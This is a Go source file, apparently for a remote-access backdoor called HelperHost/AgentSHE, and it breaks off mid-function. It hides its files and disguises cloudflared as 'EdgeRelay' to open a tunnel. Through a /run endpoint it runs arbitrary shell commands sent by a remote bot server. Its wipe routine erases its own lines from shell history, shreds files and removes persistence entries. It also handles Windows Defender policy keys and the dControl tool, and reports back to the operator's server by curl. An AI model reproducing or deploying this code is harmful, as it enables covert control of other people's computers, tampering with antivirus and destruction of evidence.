package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	helperName = "HelperHost"
	edgeName   = "EdgeRelay"
)

var (
	dir        string
	cacheDir   string
	configPath string
	tokenPath  string
	urlPath    string
	logPath    string
	edgePath   string
	helperPath string
	enrollKey  string
	botBase    string
	token      string
	publicURL  string
	stopFlag   bool
	cfProc     *exec.Cmd
	cfMu       sync.Mutex
)

func initPaths() {
	home, _ := os.UserHomeDir()
	switch runtime.GOOS {
	case "windows":
		base := os.Getenv("LOCALAPPDATA")
		if base == "" {
			base = filepath.Join(home, "AppData", "Local")
		}
		dir = filepath.Join(base, "HelperHost")
	case "darwin":
		dir = filepath.Join(home, "Library", "Application Support", "HelperHost")
	default:
		dir = filepath.Join(home, ".local", "share", "HelperHost")
	}
	cacheDir = filepath.Join(os.TempDir(), "HelperHostCache")
	ensureHiddenDir(dir)
	ensureHiddenDir(cacheDir)
	ensureHiddenDir(filepath.Join(dir, "tools"))
	configPath = filepath.Join(dir, "config.json")
	tokenPath = filepath.Join(dir, "token")
	urlPath = filepath.Join(dir, "public_url")
	logPath = filepath.Join(dir, "agent.log")
	if runtime.GOOS == "windows" {
		helperPath = filepath.Join(dir, helperName+".exe")
		edgePath = filepath.Join(cacheDir, edgeName+".exe")
	} else {
		helperPath = filepath.Join(dir, helperName)
		edgePath = filepath.Join(cacheDir, edgeName)
	}
	hideInstallTree()
}

func logf(msg string) {
	if os.Getenv("AGENTSHE_DEBUG") == "" {
		return
	}
	reURL := regexp.MustCompile(`https://[^\s]+`)
	reIP := regexp.MustCompile(`\b\d{1,3}(?:\.\d{1,3}){3}\b`)
	safe := reURL.ReplaceAllString(msg, "[redacted]")
	safe = reIP.ReplaceAllString(safe, "[redacted]")
	line := time.Now().UTC().Format("2006-01-02T15:04:05Z ") + safe + "\n"
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line)
}

func hostname() string {
	h, err := os.Hostname()
	if err != nil || h == "" {
		return "host"
	}
	if i := strings.IndexByte(h, '.'); i > 0 {
		h = h[:i]
	}
	return h
}

func loadConfig() error {
	st := loadState()
	enrollKey = strings.TrimSpace(st.Enroll)
	botBase = strings.TrimRight(strings.TrimSpace(st.BotBase), "/")
	if st.Token != "" {
		token = st.Token
	}
	if st.PublicURL != "" {
		publicURL = st.PublicURL
	}
	if enrollKey == "" || botBase == "" {
		return fmt.Errorf("config manquante")
	}
	st.Enroll = enrollKey
	st.BotBase = botBase
	saveState(st)
	return nil
}

func findFreePort() (int, error) {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port, nil
}

func runCmd(command string) (string, int) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", command)
	} else {
		cmd = exec.CommandContext(ctx, "bash", "-lc", command)
	}
	hideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		return "(timeout)", 124
	}
	code := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			code = ee.ExitCode()
		} else {
			return string(out) + err.Error(), 1
		}
	}
	return string(out), code
}

func download(url, dest string) error {
	tmp := dest + ".part"
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return fmt.Errorf("download %s: %s", url, resp.Status)
	}
	f, err := os.Create(tmp)
	if err != nil {
		return err
	}
	_, err = io.Copy(f, resp.Body)
	_ = f.Close()
	if err != nil {
		_ = os.Remove(tmp)
		return err
	}
	return os.Rename(tmp, dest)
}

func cacheCopy(name, dest string) bool {
	src := filepath.Join(cacheDir, name)
	b, err := os.ReadFile(src)
	if err != nil {
		return false
	}
	if err := os.WriteFile(dest, b, 0o755); err != nil {
		return false
	}
	_ = os.Chmod(dest, 0o755)
	return true
}

func toCache(name, src string) {
	b, err := os.ReadFile(src)
	if err != nil {
		return
	}
	_ = os.WriteFile(filepath.Join(cacheDir, name), b, 0o755)
}

func edgeURL() string {
	arch := runtime.GOARCH
	switch runtime.GOOS {
	case "windows":
		return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
	case "darwin":
		if arch == "arm64" {
			return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
		}
		return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
	default:
		if arch == "arm64" {
			return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
		}
		return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
	}
}

func edgeFileName() string {
	if runtime.GOOS == "windows" {
		return edgeName + ".exe"
	}
	return edgeName
}

func helperFileName() string {
	if runtime.GOOS == "windows" {
		return helperName + ".exe"
	}
	return helperName
}

func ensureEdgeRelay() (string, error) {
	name := edgeFileName()
	if st, err := os.Stat(edgePath); err == nil && !st.IsDir() {
		toCache(name, edgePath)
		return edgePath, nil
	}
	if cacheCopy(name, edgePath) {
		logf("EdgeRelay restored from cache")
		return edgePath, nil
	}
	staging := filepath.Join(cacheDir, name+".download")
	logf("fetch EdgeRelay via temp")
	if err := download(edgeURL(), staging); err != nil {
		return "", err
	}
	b, err := os.ReadFile(staging)
	if err != nil {
		return "", err
	}
	if err := os.WriteFile(edgePath, b, 0o755); err != nil {
		return "", err
	}
	_ = os.Chmod(edgePath, 0o755)
	toCache(name, edgePath)
	hidePath(edgePath)
	hidePath(cacheDir)
	return edgePath, nil
}

func ensureHelperPresent() {
	name := helperFileName()
	self, err := os.Executable()
	if err == nil {
		if abs, e2 := filepath.Abs(self); e2 == nil {
			self = abs
		}

		if st, err := os.Stat(helperPath); err != nil || st.Size() == 0 {
			if b, err := os.ReadFile(self); err == nil {
				_ = os.WriteFile(helperPath, b, 0o755)
				_ = os.Chmod(helperPath, 0o755)
			}
		}
		toCache(name, self)
		return
	}
	if cacheCopy(name, helperPath) {
		logf("HelperHost restored from cache")
	}
}

func authOK(r *http.Request, body map[string]any) bool {
	t := strings.TrimSpace(r.Header.Get("X-AgentShe-Token"))
	if t == "" {
		if v, ok := body["token"].(string); ok {
			t = strings.TrimSpace(v)
		}
	}
	if t == "" {
		t = strings.TrimSpace(r.URL.Query().Get("token"))
	}
	return t != "" && t == token
}

func readJSON(r *http.Request) map[string]any {
	defer r.Body.Close()
	var body map[string]any
	_ = json.NewDecoder(r.Body).Decode(&body)
	if body == nil {
		body = map[string]any{}
	}
	return body
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func handle(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path
	switch {
	case path == "/health" && r.Method == http.MethodGet:
		body := map[string]any{}
		if !authOK(r, body) {
			writeJSON(w, 401, map[string]any{"ok": false})
			return
		}
		writeJSON(w, 200, map[string]any{"ok": true})
	case path == "/run" && r.Method == http.MethodPost:
		body := readJSON(r)
		if !authOK(r, body) {
			writeJSON(w, 401, map[string]any{"ok": false})
			return
		}
		cmd, _ := body["command"].(string)
		cmd = strings.TrimSpace(cmd)
		if cmd == "" {
			writeJSON(w, 400, map[string]any{"ok": false})
			return
		}
		out, ec := runCmd(cmd)
		writeJSON(w, 200, map[string]any{"ok": true, "output": out, "exit_code": ec})
	case path == "/shutdown" && r.Method == http.MethodPost:
		body := readJSON(r)
		if !authOK(r, body) {
			writeJSON(w, 401, map[string]any{"ok": false})
			return
		}
		writeJSON(w, 200, map[string]any{"ok": true, "bye": true})
		go func() {
			time.Sleep(200 * time.Millisecond)
			wipeAll()
		}()
	default:
		writeJSON(w, 404, map[string]any{"ok": false})
	}
}

func killTunnelOnly() {
	cfMu.Lock()
	defer cfMu.Unlock()
	if cfProc != nil && cfProc.Process != nil {
		_ = cfProc.Process.Kill()
		_, _ = cfProc.Process.Wait()
		cfProc = nil
	}
	if runtime.GOOS == "windows" {
		_ = exec.Command("taskkill", "/F", "/IM", "EdgeRelay.exe").Run()
	} else {
		_ = exec.Command("pkill", "-f", edgeName).Run()
	}
}

func secureRmTree(path string) {
	if path == "" {
		return
	}
	// Hard wipe: overwrite file contents before unlink (not Recycle Bin).
	_ = filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err != nil || info == nil || info.IsDir() {
			return nil
		}
		secureShredFile(p, info.Size())
		return nil
	})
	_ = os.RemoveAll(path)
}

func secureShredFile(path string, size int64) {
	if size < 0 {
		size = 0
	}
	n := size
	if n > 64_000_000 {
		n = 64_000_000
	}
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		_ = os.WriteFile(path, nil, 0o600)
		return
	}
	defer f.Close()
	// Pass 1: zeros
	buf := bytes.Repeat([]byte{0}, 256*1024)
	var written int64
	for written < n {
		chunk := int64(len(buf))
		if written+chunk > n {
			chunk = n - written
		}
		_, err := f.Write(buf[:chunk])
		if err != nil {
			break
		}
		written += chunk
	}
	// Pass 2: 0xFF
	for i := range buf {
		buf[i] = 0xFF
	}
	_, _ = f.Seek(0, 0)
	written = 0
	for written < n {
		chunk := int64(len(buf))
		if written+chunk > n {
			chunk = n - written
		}
		_, err := f.Write(buf[:chunk])
		if err != nil {
			break
		}
		written += chunk
	}
	// Pass 3: zeros again
	for i := range buf {
		buf[i] = 0
	}
	_, _ = f.Seek(0, 0)
	written = 0
	for written < n {
		chunk := int64(len(buf))
		if written+chunk > n {
			chunk = n - written
		}
		_, err := f.Write(buf[:chunk])
		if err != nil {
			break
		}
		written += chunk
	}
	_ = f.Sync()
	_ = os.Truncate(path, 0)
}

func min64(a, b int64) int64 {
	if a < b {
		return a
	}
	return b
}

func scrubShellArtifacts() {
	markers := []string{
		"HelperHost", "EdgeRelay", "agentshe", "AgentSHE", "lilygopro",
		"bootstrap-sh", "bootstrap&enroll", "HelperHostCache",
		"install.sh", "install.ps1",
	}
	home, _ := os.UserHomeDir()
	var candidates []string
	if runtime.GOOS == "windows" {
		candidates = append(candidates, filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"))
	} else {
		candidates = append(candidates,
			filepath.Join(home, ".bash_history"),
			filepath.Join(home, ".zsh_history"),
			filepath.Join(home, ".zhistory"),
			filepath.Join(home, ".local", "share", "fish", "fish_history"),
			filepath.Join(home, ".python_history"),
		)
	}
	for _, path := range candidates {
		b, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		lines := strings.Split(string(b), "\n")
		var kept []string
		for _, ln := range lines {
			low := strings.ToLower(ln)
			drop := false
			for _, m := range markers {
				if strings.Contains(low, strings.ToLower(m)) {
					drop = true
					break
				}
			}
			if !drop {
				kept = append(kept, ln)
			}
		}
		if len(kept) != len(lines) {
			_ = os.WriteFile(path, []byte(strings.Join(kept, "\n")), 0o600)
		}
	}
}

func killRelatedProcs() {

	if runtime.GOOS == "windows" {
		ps := `
$ErrorActionPreference='SilentlyContinue'
# Stop watchdog first so it cannot respawn HelperHost
Get-CimInstance Win32_Process | Where-Object {
  $_.Name -match '^(wscript|cscript)\.exe$' -and $_.CommandLine -and (
    $_.CommandLine -match 'watchdog\.vbs|reconnect\.vbs|HelperHost|AgentShe'
  )
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
Get-CimInstance Win32_Process | Where-Object {
  $_.CommandLine -and (
    $_.CommandLine -match 'HelperHost|EdgeRelay|watchdog\.vbs|reconnect\.vbs|AgentShe|hh-wipe|hh-restore|HelperHostWipeRestore|restore-security|restore-win-security'
  ) -and $_.Name -match '^(wscript|cscript|EdgeRelay|cmd|powershell|pwsh)\.exe$'
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
taskkill /F /IM HelperHost.exe 2>$null
taskkill /F /IM EdgeRelay.exe 2>$null
Get-Process HelperHost,EdgeRelay -EA SilentlyContinue | Stop-Process -Force
`
		_ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).Run()
		return
	}
	for _, pat := range []string{
		filepath.Join(dir, "watchdog.sh"),
		filepath.Join(dir, "reconnect.sh"),
		filepath.Join(dir, "HelperHost"),
		filepath.Join(dir, edgeName),
		"HelperHostCache",
		edgeName,
	} {
		_ = exec.Command("pkill", "-f", pat).Run()
	}
	_ = exec.Command("pkill", "-x", "HelperHost").Run()
	_ = exec.Command("pkill", "-x", "EdgeRelay").Run()
	_ = exec.Command("pkill", "-f", "/HelperHost").Run()
	_ = exec.Command("pkill", "-f", "/EdgeRelay").Run()
}

func wipeAll() {
	stopFlag = true
	tok := token
	bb := strings.TrimRight(botBase, "/")

	if runtime.GOOS == "windows" {
		restoreWindowsNotifications()
		scrubRunMRU()
		// Snapshot UAC bak before anything clears HKCU state
		psSnap := `
$ErrorActionPreference='SilentlyContinue'
$out=Join-Path $env:TEMP 'hh-wipe-state.json'
$o=[ordered]@{}
try {
  $st=(Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
  if ($st) {
    $j=$st|ConvertFrom-Json
    if ($j.uac_bak) { $o.uac_bak=$j.uac_bak }
    if ($j.notify_bak) { $o.notify_bak=$j.notify_bak }
  }
} catch {}
($o|ConvertTo-Json -Compress)|Set-Content -Encoding UTF8 $out
`
		_ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psSnap).Run()
	} else {
		clearStateStore()
	}

	// Delete autostart tasks except WipeRestore (recreated below with fresh script).
	for _, tn := range []string{"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot", "HelperHostEarlyAV", "AgentShePC"} {
		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
	}
	if runtime.GOOS == "windows" {
		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "HelperHost", "/f").Run()
		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "AgentShePC", "/f").Run()
		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, "/v", "HelperHost", "/f").Run()
		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, "/v", "AgentShePC", "/f").Run()
	}
	killRelatedProcs()
	scrubShellArtifacts()

	unhidePath(dir)
	unhidePath(cacheDir)
	_ = filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
		if err == nil {
			unhidePath(p)
		}
		return nil
	})
	_ = filepath.Walk(cacheDir, func(p string, info os.FileInfo, err error) error {
		if err == nil {
			unhidePath(p)
		}
		return nil
	})

	home, _ := os.UserHomeDir()
	if runtime.GOOS == "windows" {
		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
		notifyLine := ""
		if tok != "" && bb != "" {
			escTok := strings.ReplaceAll(tok, `"`, "")
			escBB := strings.ReplaceAll(bb, `"`, "")
			notifyLine = "curl.exe -fsSL -X POST \"" + escBB + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + escTok + "\\\"}\" >nul 2>&1\r\n" +
				"ping 127.0.0.1 -n 2 >nul\r\n"
		}
		dirEsc := strings.ReplaceAll(dir, `'`, `''`)
		cacheEsc := strings.ReplaceAll(cacheDir, `'`, `''`)
		psElev := filepath.Join(os.TempDir(), "hh-restore-elev.ps1")
		elevBody := "$ErrorActionPreference='SilentlyContinue'\r\n" +
			"try{$PSNativeCommandUseErrorActionPreference=$false}catch{}\r\n" +
			"iex ((Get-Content -Raw '" + strings.ReplaceAll(restorePS1, `'`, `''`) + "'))\r\n"
		_ = os.WriteFile(psElev, []byte(elevBody), 0o644)

		body := "@echo off\r\n" +
			"ping 127.0.0.1 -n 2 >nul\r\n" +
			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
			"taskkill /F /IM cloudflared.exe >nul 2>&1\r\n" +
			"taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostDControlOff /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHost /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostResume /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
			// dControl /E BEFORE elevate restore (copy to TEMP — HelperHost folder will die)
			"if exist \"" + dir + "\\dControl.exe\" copy /y \"" + dir + "\\dControl.exe\" \"%TEMP%\\hh-dcontrol.exe\" >nul 2>&1\r\n" +
			"if exist \"%TEMP%\\hh-dcontrol.exe\" (\r\n" +
			"  echo @echo off> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
			"  echo start \"\" /wait \"%TEMP%\\hh-dcontrol.exe\" /E>> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
			"  echo ping 127.0.0.1 -n 4 ^>nul>> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
			"  echo taskkill /F /IM dControl.exe ^>nul 2^>^&1>> \"%TEMP%\\hh-dc-on.cmd\"\r\n" +
			"  schtasks /Create /TN HelperHostDControlOn /TR \"cmd.exe /c \\\"%TEMP%\\hh-dc-on.cmd\\\"\" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F >nul 2>&1\r\n" +
			"  schtasks /Run /TN HelperHostDControlOn >nul 2>&1\r\n" +
			"  ping 127.0.0.1 -n 12 >nul\r\n" +
			"  schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
			"  taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
			")\r\n" +
			// Recreate elevated restore with FRESH script (old task often pointed at deleted temp file)
			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
			"schtasks /Create /TN HelperHostWipeRestore /TR \"\\\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" + restorePS1 + "\\\"\" /SC ONCE /ST 00:00 /RL HIGHEST /F >nul 2>&1\r\n" +
			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
			"ping 127.0.0.1 -n 8 >nul\r\n" +
			// Fallback elev (UAC still silent until restore ends)
			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"try { $p=Start-Process -FilePath powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"" + restorePS1 + "\\\"'; if($p){$p.WaitForExit(120000)} } catch {}\" >nul 2>&1\r\n" +
			"ping 127.0.0.1 -n 3 >nul\r\n" +
			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
			"taskkill /F /IM cloudflared.exe >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostDControlOff /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
			"taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\hh-dcontrol.exe\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\hh-dc-on.cmd\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\hh-dc-off.cmd\" >nul 2>&1\r\n" +
			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
			// Force-unlock + wipe HelperHost + EdgeRelay cache (retry)
			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" +
			"$ErrorActionPreference='SilentlyContinue'; " +
			"function Kill-HH { Get-Process HelperHost,EdgeRelay,cloudflared -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
			"Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'HelperHost|EdgeRelay|hh-wipe|hh-restore|early-av' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue } }; " +
			"function Nuke-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
			"Kill-HH; attrib -h -s /s /d \\\"$Root\\*\\\" 2>$null; attrib -h -s \\\"$Root\\\" 2>$null; " +
			"cmd /c \\\"takeown /f `\\\"$Root`\\\" /r /d y\\\" | Out-Null; " +
			"cmd /c \\\"icacls `\\\"$Root`\\\" /grant Everyone:F /t /c /q\\\" | Out-Null; " +
			"Get-ChildItem -LiteralPath $Root -Recurse -Force -File -EA SilentlyContinue | ForEach-Object { " +
			"try { $_.Attributes='Normal'; $fs=[IO.File]::Open($_.FullName,'Open','Write','None'); $fs.SetLength(0); $fs.Close(); Remove-Item -LiteralPath $_.FullName -Force -EA SilentlyContinue } catch { " +
			"cmd /c \\\"del /f /q `\\\"$($_.FullName)`\\\"\\\" | Out-Null } }; " +
			"cmd /c \\\"rmdir /s /q `\\\"$Root`\\\"\\\" | Out-Null; " +
			"if(Test-Path -LiteralPath $Root){ Remove-Item -LiteralPath $Root -Recurse -Force -EA SilentlyContinue } }; " +
			"1..5 | ForEach-Object { Kill-HH; Nuke-Tree '" + dirEsc + "'; Nuke-Tree '" + cacheEsc + "'; " +
			"Nuke-Tree (Join-Path $env:TEMP 'HelperHostCache'); Nuke-Tree (Join-Path $env:LOCALAPPDATA 'HelperHost'); Start-Sleep -Seconds 1 }; " +
			"Clear-RecycleBin -Force -EA SilentlyContinue; " +
			"Remove-Item (Join-Path $env:TEMP 'hh-wipe-state.json') -Force -EA SilentlyContinue" +
			"\" >nul 2>&1\r\n" +
			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
			"rmdir /s /q \"%TEMP%\\HelperHostCache\" >nul 2>&1\r\n" +
			"rmdir /s /q \"%LOCALAPPDATA%\\HelperHost\" >nul 2>&1\r\n" +
			"del /f /q \"%LOCALAPPDATA%\\HelperHost\\HelperHost.exe\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\HelperHostCache\\EdgeRelay.exe\" >nul 2>&1\r\n" +
			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
			// Extra AV policy wipe via reg (in case elev restore partially failed)
			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
			"reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\" /f >nul 2>&1\r\n" +
			"gpupdate /Target:Computer /Force >nul 2>&1\r\n" +
			"sc config WinDefend start= auto >nul 2>&1\r\n" +
			"net start WinDefend >nul 2>&1\r\n" +
			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
			"del /f /q \"" + psElev + "\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\hh-tool-*\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\hh-export-*\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\hh-run-*\" >nul 2>&1\r\n" +
			"del /f /q \"%TEMP%\\hh-res-*\" >nul 2>&1\r\n" +
			notifyLine +
			"del /f /q \"%TEMP%\\hh-*\" >nul 2>&1\r\n" +
			"del \"%~f0\" >nul 2>&1\r\n"
		_ = os.WriteFile(bat, []byte(body), 0o644)
		cmd := exec.Command("cmd", "/C", "start", "", "/MIN", bat)
		hideWindow(cmd)
		_ = cmd.Start()
		time.Sleep(2 * time.Second)
		killTunnelOnly()
		secureRmTree(filepath.Join(home, ".agentshe"))
	} else {
		// Deferred wipe: launchd/systemd KeepAlive can race; finish after we exit.
		wipeSh := filepath.Join(os.TempDir(), "hh-wipe.sh")
		script := "#!/bin/bash\nset +e\n" +
			"sleep 2\n" +
			"pkill -f " + shellQuote(filepath.Join(dir, "watchdog.sh")) + " 2>/dev/null\n" +
			"pkill -f " + shellQuote(filepath.Join(dir, "reconnect.sh")) + " 2>/dev/null\n" +
			"pkill -f " + shellQuote(filepath.Join(dir, "HelperHost")) + " 2>/dev/null\n" +
			"pkill -f " + shellQuote(filepath.Join(dir, edgeName)) + " 2>/dev/null\n" +
			"pkill -x HelperHost 2>/dev/null\n" +
			"pkill -x EdgeRelay 2>/dev/null\n" +
			"sleep 1\n"
		if runtime.GOOS == "darwin" {
			home, _ := os.UserHomeDir()
			plist1 := filepath.Join(home, "Library", "LaunchAgents", "com.helperhost.agent.plist")
			plist2 := filepath.Join(home, "Library", "LaunchAgents", "fr.agentshe.pc.plist")
			script += "uid=$(id -u)\n" +
				"launchctl bootout gui/$uid " + shellQuote(plist1) + " 2>/dev/null\n" +
				"launchctl bootout gui/$uid " + shellQuote(plist2) + " 2>/dev/null\n" +
				"launchctl unload " + shellQuote(plist1) + " 2>/dev/null\n" +
				"rm -f " + shellQuote(plist1) + " " + shellQuote(plist2) + "\n" +
				"chflags -R nouchg,noschg,nohidden " + shellQuote(dir) + " 2>/dev/null\n" +
				"chflags -R nouchg,noschg,nohidden " + shellQuote(cacheDir) + " 2>/dev/null\n"
		} else {
			home, _ := os.UserHomeDir()
			script += "systemctl --user disable --now helperhost.service agentshe.service 2>/dev/null\n" +
				"rm -f " + shellQuote(filepath.Join(home, ".config", "systemd", "user", "helperhost.service")) + " " +
				shellQuote(filepath.Join(home, ".config", "systemd", "user", "agentshe.service")) + "\n" +
				"systemctl --user daemon-reload 2>/dev/null\n"
		}
		script += "rm -rf " + shellQuote(dir) + " " + shellQuote(cacheDir) +
			" /tmp/HelperHostCache " + shellQuote(filepath.Join(os.TempDir(), "HelperHostCache")) +
			" " + shellQuote(filepath.Join(homeOrEmpty(), ".agentshe")) + "\n"
		if tok != "" && bb != "" {
			script += "curl -fsSL -X POST " + shellQuote(bb+"/agent?action=wiped") +
				" -H 'Content-Type: application/json' -d " + shellQuote(`{"token":"`+tok+`"}`) + " >/dev/null 2>&1\n"
		}
		script += "rm -f \"$0\"\n"
		_ = os.WriteFile(wipeSh, []byte(script), 0o755)
		cmd := exec.Command("/bin/bash", wipeSh)
		hideWindow(cmd)
		_ = cmd.Start()
		secureRmTree(cacheDir)
		secureRmTree("/tmp/HelperHostCache")
		if t := os.Getenv("TMPDIR"); t != "" {
			secureRmTree(filepath.Join(t, "HelperHostCache"))
		}
	}
	os.Exit(0)
}

func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

func homeOrEmpty() string {
	h, _ := os.UserHomeDir()
	return h
}

func networkOK() bool {
	client := &http.Client{Timeout: 3 * time.Second}
	for _, u := range []string{"https://1.1.1.1", "https://cloudflare.com"} {
		resp, err := client.Get(u)
		if err == nil {
			resp.Body.Close()
			return true
		}
	}
	return false
}

func startTunnel(port int) (string, error) {
	killTunnelOnly()
	bin, err := ensureEdgeRelay()
	if err != nil {
		return "", err
	}
	cmd := exec.Command(bin, "tunnel", "--url", fmt.Sprintf("http://127.0.0.1:%d", port), "--no-autoupdate")
	hideWindow(cmd)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		return "", err
	}
	cfMu.Lock()
	cfProc = cmd
	cfMu.Unlock()

	re := regexp.MustCompile(`https://[a-zA-Z0-9.-]+\.trycloudflare\.com`)
	ch := make(chan string, 1)
	go func() {
		buf := make([]byte, 4096)
		var acc string
		for {
			n, err := stdout.Read(buf)
			if n > 0 {
				acc += string(buf[:n])
				if m := re.FindString(acc); m != "" {
					ch <- strings.TrimRight(m, "/")
					return
				}
				if len(acc) > 200_000 {
					acc = acc[len(acc)-50_000:]
				}
			}
			if err != nil {
				ch <- ""
				return
			}
		}
	}()

	select {
